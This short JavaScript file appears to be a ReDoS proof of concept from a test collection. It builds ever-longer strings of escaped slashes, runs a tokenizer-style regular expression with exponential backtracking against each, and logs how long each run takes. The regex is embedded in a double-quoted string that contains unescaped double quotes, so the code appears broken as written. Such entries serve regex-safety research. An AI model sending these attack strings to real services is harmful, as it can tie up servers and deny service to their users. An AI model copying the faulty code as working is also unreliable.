/* 3303
 * (\/\*[\s\S.]+?\*\/|[/]{2,}.*|\/((\\\/)|.??)*\/[gim]{0,3}|'((\\\')|.??)*'|"((\\\")|.??)*"|-?\d+\.\d+e?-?e?\d*|-?\.\d+e-?\d+|\w+|[\[\]\(\)\{\}:=;"'\-&!|+,.\/*])
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:"/"+"\\/"*32+"◎@! _1_EOD(i1)"
 */
var REGEX = new RegExp("(\/\*[\s\S.]+?\*\/|[/]{2,}.*|\/((\\\/)|.??)*\/[gim]{0,3}|'((\\\')|.??)*'|"((\\\")|.??)*"|-?\d+\.\d+e?-?e?\d*|-?\.\d+e-?\d+|\w+|[\[\]\(\)\{\}:=;"'\-&!|+,.\/*])")
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '/' + '\\/'.repeat(i*1) + '◎@! _1_EOD(i1)'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}